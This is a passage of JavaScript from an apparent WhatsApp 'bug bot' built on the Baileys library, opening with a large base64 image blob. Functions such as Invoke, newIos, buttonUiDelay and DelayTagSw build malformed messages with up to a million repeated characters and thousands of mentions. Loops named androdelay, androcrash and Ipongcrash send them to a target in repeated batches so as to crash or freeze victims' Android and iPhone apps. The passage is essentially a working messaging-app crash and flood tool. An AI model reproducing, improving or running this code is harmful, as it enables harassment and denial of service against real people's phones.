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",
            itemCount: 100000,
            status: "INQUIRY",
            surface: "CATALOG",
            message: "🚯⃟⃑.Ꮡ‌‌/𝘅⃬𝗿𝗹⃗.𝛆",
            orderTitle: "wtf bro?!!",
            sellerJid: "74561135624407@lid",
            token: "Ad/0WghCEVJRfVOygxvH83x7e+mIu6RRMDXTkBx/qXVlDA==",
            totalAmount1000: "999999",
            totalCurrencyCode: "IDR",
            messageVersion: 2
        }
    }, {});

    await sock.relayMessage("status@broadcast", msg.message, {
        messageId: msg.key.id,
        statusJidList: [target],
        additionalNodes: [
            {
                tag: "meta",
                attrs: {},
                content: [
                    {
                        tag: "mentioned_users",
                        attrs: {},
                        content: [
                            { tag: "to", attrs: { jid: target }, content: undefined }
                        ],
                    },
                ],
            },
        ],
    });

    if (mention) {
        await sock.relayMessage(
            target,
            {
                groupStatusMentionMessage: {
                    message: { protocolMessage: { key: msg.key, type: 25 } },
                },
            },
            {
                additionalNodes: [
                    { tag: "meta", attrs: { is_status_mention: "CrashGroup" }, content: undefined }
                ],
            }
        );
    }
}

async function Invoke(sock, target) {
        const messsage = {
            botInvokeMessage: {
                message: {
                    newsletterAdminInviteMessage: {
                        newsletterJid: `33333333333333333@newsletter`,
                        newsletterName: "-xrelly - blankMode" + "ી".repeat(120000),
                        jpegThumbnail: "",
                        caption: "ꦽ".repeat(120000),
                        inviteExpiration: Date.now() + 1814400000,
                    },
                },
            },
        };
        await sock.relayMessage(target, messsage, {
            userJid: target,
        });
    }
    
async function newIos(sock, target) {
  const etc = await generateWAMessageFromContent(
    target,
    {
      extendedTextMessage: {
        text: "💤⃟⃰ᰧ./𝘅𝗿𝗹.𝛆𝛘𝛆 ✩ > https://Wa.me/stickerpack/AllTheFeels",
        matchedText: "https://Wa.me/stickerpack/xrelly",
        description:
          "҉҈⃝⃞⃟⃠⃤꙰꙲" +
          "𑇂𑆵𑆴𑆿".repeat(15000),
        title:
          "‼️⃟ ‌‌./𝘅𝗿𝗹.𝛆𝛘𝛆 ✩" +
          "𑇂𑆵𑆴𑆿".repeat(15000),
        previewType: "NONE",
        jpegThumbnail: null,
        inviteLinkGroupTypeV2: "DEFAULT",
      },
    },
    {
      ephemeralExpiration: 5,
      timeStamp: Date.now(),
    }
  );

  await sock.relayMessage(target, etc.message, {
    messageId: etc.key.id,
  });
}

async function buttonUiDelay(target) {
     
  const msg = generateWAMessageFromContent(target, {
    viewOnceMessage: {
      message: {
        buttonsMessage: {
          contentText: "𐍇𐍂𐌴𐍧𐍧𐍅 𝚵𝚳𝚸𝚬𝚪𝚯𝐑" + "ꦽ".repeat(1030),
          footerText: "-xrelly 1st",
          buttons: [
            {
              buttonId: "crash1",
              buttonText: { displayText: "P"},
              type: 1
            },
            {
              buttonId: "crash2",
              buttonText: { displayText: "P"},
              type: 1
            },
            {
              buttonId: "crash3",
              buttonText: { displayText: "P"},
              type: 1
            }
          ],
          headerType: 1,
          contextInfo: {
            mentionedJid: [
            "6285215587438@s.whatsapp.net", ...Array.from({ length: 1000 }, () => `1${Math.floor(Math.random() * 50000)}@
                      s.whatsapp.net`)
                      ],
            forwardingScore: 9999,
            isForwarded: true,
            externalAdReply: {
              title: " X ",
              body: " X ",
              mediaType: 1,
              renderLargerThumbnail: true,
              showAdAttribution: true
            }
          }
        }
      }
    }
  }, {
    participant: target
  });

  await sock.relayMessage(target, msg.message, { messageId: msg.key.id });
}

async function DelayTagSw(sock, target) {
  let mentionList = generateMentions(1900);
  let aksara = "ꦀ".repeat(3000) + "\n" + "ꦂ‎".repeat(3000);
  let parse = true;
  let SID = "5e03e0&mms3";
  let key = "10000000_2012297619515179_5714769099548640934_n.enc";
  let type = `image/webp`;

  if (11 > 9) {
    parse = parse ? false : true;
  }
  
      const X = {
    musicContentMediaId: "589608164114571",
    songId: "870166291800508",
    author: ".XrL" + "ោ៝".repeat(10000),
    title: "XxX",
    artworkDirectPath: "/v/t62.76458-24/11922545_2992069684280773_7385115562023490801_n.enc?ccb=11-4&oh=01_Q5AaIaShHzFrrQ6H7GzLKLFzY5Go9u85Zk0nGoqgTwkW2ozh&oe=6818647A&_nc_sid=5e03e0",
    artworkSha256: "u+1aGJf5tuFrZQlSrxES5fJTx+k0pi2dOg+UQzMUKpI=",
    artworkEncSha256: "iWv+EkeFzJ6WFbpSASSbK5MzajC+xZFDHPyPEQNHy7Q=",
    artistAttribution: "https://www.instagram.com/_u/tamainfinity_",
    countryBlocklist: true,
    isExplicit: true,
    artworkMediaKey: "S18+VRv7tkdoMMKDYSFYzcBx4NCM3wPbQh+md6sWzBU="
  };

  
      let biji2 = await generateWAMessageFromContent(
        target,
        {
            viewOnceMessage: {
                message: {
                    interactiveResponseMessage: {
                        body: {
                            text: " - who are you ? ",
                            format: "DEFAULT",
                        },
                        nativeFlowResponseMessage: {
                            name: "galaxy_message",
                            paramsJson: "\x10".repeat(1045000),
                            version: 3,
                        },
                        entryPointConversionSource: "call_permission_request",
                    },
                },
            },
        },
        {
            ephemeralExpiration: 0,
            forwardingScore: 9741,
            isForwarded: true,
            font: Math.floor(Math.random() * 99999999),
            background:
                "#" +
                Math.floor(Math.random() * 16777215)
                    .toString(16)
                    .padStart(6, "99999999"),
        }
    );    
    
    let message = {
    viewOnceMessage: {
      message: {
        stickerMessage: {
          url: "https://mmg.whatsapp.net/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0&mms3=true",
          fileSha256: "xUfVNM3gqu9GqZeLW3wsqa2ca5mT9qkPXvd7EGkg9n4=",
          fileEncSha256: "zTi/rb6CHQOXI7Pa2E8fUwHv+64hay8mGT1xRGkh98s=",
          mediaKey: "nHJvqFR5n26nsRiXaRVxxPZY54l0BDXAOGvIPrfwo9k=",
          mimetype: "image/webp",
          directPath:
            "/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0",
          fileLength: { low: 1, high: 0, unsigned: true },
          mediaKeyTimestamp: {
            low: 1746112211,
            high: 0,
            unsigned: false,
          },
          firstFrameLength: 19904,
          firstFrameSidecar: "KN4kQ5pyABRAgA==",
          isAnimated: true,
          contextInfo: {
            mentionedJid: ["13135550002@s.whatsapp.net"],
            groupMentions: [],
            entryPointConversionSource: "non_contact",
            entryPointConversionApp: "whatsapp",
            entryPointConversionDelaySeconds: 467593,
          },
          stickerSentTs: {
            low: -1939477883,
            high: 406,
            unsigned: false,
          },
          isAvatar: true,
          isAiSticker: true,
          isLottie: true,
        },
      },
    },
  };
  
    const tmsg = await generateWAMessageFromContent(target, {
    requestPhoneNumberMessage: {
      contextInfo: {
        businessMessageForwardInfo: {
          businessOwnerJid: "13135550002@s.whatsapp.net"
        },
        stanzaId: "XrL-Id" + Math.floor(Math.random() * 99999),
        forwardingScore: 100,
        isForwarded: true,
        forwardedNewsletterMessageInfo: {
          newsletterJid: "120363321780349272@newsletter",
          serverMessageId: 1,
          newsletterName: "ោ៝".repeat(10000)
        },
        mentionedJid: mentionList,
        quotedMessage: {
          callLogMesssage: {
            isVideo: true,
            callOutcome: "1",
            durationSecs: "0",
            callType: "REGULAR",
            participants: [{
              jid: "5521992999999@s.whatsapp.net",
              callOutcome: "1"
            }]
          },
          viewOnceMessage: {
            message: {
              stickerMessage: {
                url: `https://mmg.whatsapp.net/v/t62.43144-24/${key}?ccb=11-4&oh=01_Q5Aa1gEB3Y3v90JZpLBldESWYvQic6LvvTpw4vjSCUHFPSIBEg&oe=685F4C37&_nc_sid=${SID}=true`,
                fileSha256: "xUfVNM3gqu9GqZeLW3wsqa2ca5mT9qkPXvd7EGkg9n4=",
                fileEncSha256: "zTi/rb6CHQOXI7Pa2E8fUwHv+64hay8mGT1xRGkh98s=",
                mediaKey: "nHJvqFR5n26nsRiXaRVxxPZY54l0BDXAOGvIPrfwo9k=",
                mimetype: type,
                directPath: "/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0",
                fileLength: {
                  low: Math.floor(Math.random() * 200000000),
                  high: 0,
                  unsigned: true
                },
                mediaKeyTimestamp: {
                  low: Math.floor(Math.random() * 1700000000),
                  high: 0,
                  unsigned: false
                },
                firstFrameLength: 19904,
                firstFrameSidecar: "KN4kQ5pyABRAgA==",
                isAnimated: true,
                stickerSentTs: {
                  low: Math.floor(Math.random() * -20000000),
                  high: 555,
                  unsigned: parse
                },
                isAvatar: parse,
                isAiSticker: parse,
                isLottie: parse
              }
            }
          },
          imageMessage: {
            url: "https://mmg.whatsapp.net/v/t62.7118-24/31077587_1764406024131772_5735878875052198053_n.enc?ccb=11-4&oh=01_Q5AaIRXVKmyUlOP-TSurW69Swlvug7f5fB4Efv4S_C6TtHzk&oe=680EE7A3&_nc_sid=5e03e0&mms3=true",
            mimetype: "image/jpeg",
            caption: `</> Xrelly Is Back!!! - ${aksara}`,
            fileSha256: "Bcm+aU2A9QDx+EMuwmMl9D56MJON44Igej+cQEQ2syI=",
            fileLength: "19769",
            height: 354,
            width: 783,
            mediaKey: "n7BfZXo3wG/di5V9fC+NwauL6fDrLN/q1bi+EkWIVIA=",
            fileEncSha256: "LrL32sEi+n1O1fGrPmcd0t0OgFaSEf2iug9WiA3zaMU=",
            directPath: "/v/t62.7118-24/31077587_1764406024131772_5735878875052198053_n.enc",
            mediaKeyTimestamp: "1743225419",
            jpegThumbnail: null,
            scansSidecar: "mh5/YmcAWyLt5H2qzY3NtHrEtyM=",
            scanLengths: [2437, 17332],
            contextInfo: {
              isSampled: true,
              participant: target,
              remoteJid: "status@broadcast",
              forwardingScore: 9999,
              isForwarded: true
            }
          }
        },
        annotations: [
          {
            embeddedContent: {
              X 
            },
            embeddedAction: true
          }
        ]
      }
    }
  }, {});
  
  await sock.relayMessage("status@broadcast", tmsg.message, {
    messageId: tmsg.key.id,
    statusJidList: [target],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              {
                tag: "to",
                attrs: { jid: target },
                content: undefined
              }
            ]
          }
        ]
      }
    ]
  });
  
    await sock.relayMessage("status@broadcast", message.message, {
    messageId: message.key.id,
    statusJidList: [target],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              {
                tag: "to",
                attrs: { jid: target },
                content: undefined
              }
            ]
          }
        ]
      }
    ]
  });
  
    await sock.relayMessage("status@broadcast", biji2.message, {
    messageId: biji2.key.id,
    statusJidList: [target],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              {
                tag: "to",
                attrs: { jid: target },
                content: undefined
              }
            ]
          }
        ]
      }
    ]
  });  
}

//FINAL FUNCTION 
async function GetSuZoXAndrosclfcBatch(X, BotNumber) {
    const sock = await ensureConnection(BotNumber);
    console.log(chalk.yellow(`🚀 Mulai batch bug Delay ke ${X}`));

    const duration = 30 * 60 * 1000; // contoh: 30 menit
    const start = Date.now();

    while (Date.now() - start < duration) {
        await Promise.all([
            BetaDelay(sock, X),
            DelayInvisible(sock, X),
            TraVisZap(X, true)
        ]);
        console.log(chalk.blue(`⏳ Delay batch selesai, lanjut batch berikutnya...`));
        await sleep(2000);
    }

    console.log(chalk.green(`✅ Selesai 30 menit bug Delay ke ${X}`));
}

async function androdelay(durationHours, target) {
  const totalDurationMs = durationHours * 3600000;
  const startTime = Date.now();
  let count = 0;
  let batch = 1;
  const maxBatches = 5;

  const sendNext = async () => {
    if (Date.now() - startTime >= totalDurationMs || batch > maxBatches) {
      console.log(`✅ Selesai! Total batch terkirim: ${batch - 1}`);
      return;
    }

    try {
      if (count < 400) {
        await Promise.all([          
          bulldozer(sock, target),
          coreXdelay(target),
          delay5GB(target, false),
          EvilEyeBeta(sock, target),
          delayvisibotax(sock, target),
          buttonUiDelay(target)
        ]);
        console.log(chalk.yellow(`
┌────────────────────────┐
│ ${count + 1}/400 Send Delay 🦠
└────────────────────────┘
  `));
        count++;
        setTimeout(sendNext, 2000); // ⏳ jeda 2 detik antar kiriman
      } else {
        console.log(chalk.green(`✅ Succes Send Bugs to ${target} (Batch ${batch})`));
        if (batch < maxBatches) {
          console.log(chalk.yellow(`( Grade Xtordcv 🍂 777 ).`));
          count = 0;
          batch++;
          setTimeout(sendNext, 5000); // ⏳ jeda 5 detik antar batch
        } else {
          console.log(chalk.blue(`( Done ) ${maxBatches} batch.`));
        }
      }
    } catch (error) {
      console.error(`❌ Error saat mengirim: ${error.message}`);
      setTimeout(sendNext, 2000); // tetap pakai jeda antar kiriman
    }
  };
  sendNext();
}

async function androcrash(durationHours, target) {
  const totalDurationMs = durationHours * 3600000;
  const startTime = Date.now();
  let count = 0;
  let batch = 1;
  const maxBatches = 5;

  const sendNext = async () => {
    if (Date.now() - startTime >= totalDurationMs || batch > maxBatches) {
      console.log(`✅ Selesai! Total batch terkirim: ${batch - 1}`);
      return;
    }

    try {
      if (count < 400) {
        await Promise.all([
          crashclick(sock, target),
          invo(sock, target),
          CallUi(target),
          HytamJirt(target),
          fcComun(sock, target),
          otaxnewdocu(sock, target),
          await Invoke(sock, target)
        ]);
        console.log(chalk.yellow(`
┌────────────────────────┐
│ ${count + 1}/400 Send Bug Crash 
└────────────────────────┘
  `));
        count++;
        setTimeout(sendNext, 2000); // ⏳ jeda 2 detik antar kiriman
      } else {
        console.log(chalk.green(`👀 Succes Send Bugs to ${X} (Batch ${batch})`));
        if (batch < maxBatches) {
          console.log(chalk.yellow(`( Grade Xtordcv 🍂 777 ).`));
          count = 0;
          batch++;
          setTimeout(sendNext, 5000); // ⏳ jeda 5 detik antar batch
        } else {
          console.log(chalk.blue(`( Done ) ${maxBatches} batch.`));
        }
      }
    } catch (error) {
      console.error(`❌ Error saat mengirim: ${error.message}`);
      setTimeout(sendNext, 2000); // tetap pakai jeda antar kiriman
    }
  };
  sendNext();
}

async function Ipongcrash(durationHours, target) {
  const totalDurationMs = durationHours * 3600000;
  const startTime = Date.now();
  let count = 0;
  let batch = 1;
  const maxBatches = 5;

  const sendNext = async () => {
    if (Date.now() - startTime >= totalDurationMs || batch > maxBatches) {
      console.log(`✅ Selesai! Total batch terkirim: ${batch - 1}`);
      return;
    }

    try {
      if (count < 400) {
        await Promise.all([
          newIos(sock, target),
          buttonUiDelay(target),
          DelayTagSw(sock, target)
        ]);
        console.log(chalk.yellow(`
┌────────────────────────┐
│ ${count + 1}/400 Crash iPhone 
└────────────────────────┘
  `));
        count++;
